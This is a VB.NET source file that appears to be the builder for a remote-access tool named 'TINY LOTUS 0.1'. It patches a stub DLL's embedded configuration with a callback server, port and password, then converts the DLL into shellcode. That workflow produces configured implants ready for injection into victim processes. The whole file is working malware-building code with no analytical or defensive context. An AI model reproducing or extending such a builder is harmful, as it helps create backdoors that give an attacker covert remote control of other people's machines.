Imports System.IO

Public Class clsBuilder
    Public Function BuildDLL(ByVal server As String, ByVal port As UInt16, ByVal password As String) As Byte()
        Dim stubDll As Byte() = File.ReadAllBytes("S.dll")
        Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten()
        Dim config As Byte() = Nothing
        Dim configOffset As UInt32 = SearchForConfigOffset(stubDll)
        If configOffset = &HFFFFFFFFUI Then
            MsgBox("Invalid stub file", MsgBoxStyle.Critical, "Error")
            Return Nothing
        End If
        BinWritter.BufferAddDword(config, Utilities.RandomDWORD())
        BinWritter.BufferAddDword(config, Utilities.RandomDWORD())
        BinWritter.BufferMerge(config, System.Text.Encoding.Unicode.GetBytes("TINY LOTUS 0.1".PadRight(20)))
        BinWritter.BufferMerge(config, System.Text.Encoding.UTF8.GetBytes(server.PadRight(50, vbNullChar)))
        BinWritter.BufferMerge(config, System.Text.Encoding.UTF8.GetBytes(password.PadRight(20, vbNullChar)))
        BinWritter.BufferAddWord(config, port)
        For i = 0 To config.Length - 1
            stubDll(configOffset + i) = config(i)
        Next
        Return stubDll
    End Function

    Public Function BuildShellcode(ByVal server As String, ByVal port As UInt16, ByVal password As String) As Byte()
        Dim dllStub As Byte() = BuildDLL(server, port, password)
        Dim dllToShellcodeObj As clsDllToShellcode = New clsDllToShellcode()
        Return dllToShellcodeObj.DllToShellcode(dllStub)
    End Function

    Private Function SearchForConfigOffset(ByVal stub As Byte()) As UInt32
        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
        For i = 0 To stub.Length - 12
            If BinReader.BufferReadDWORD(stub, i) = &HCAFEBABEUI And BinReader.BufferReadDWORD(stub, i + 4) = &HDEADBABEUI Then
                Return i
            End If
        Next
        Return &HFFFFFFFFUI
    End Function
End Class
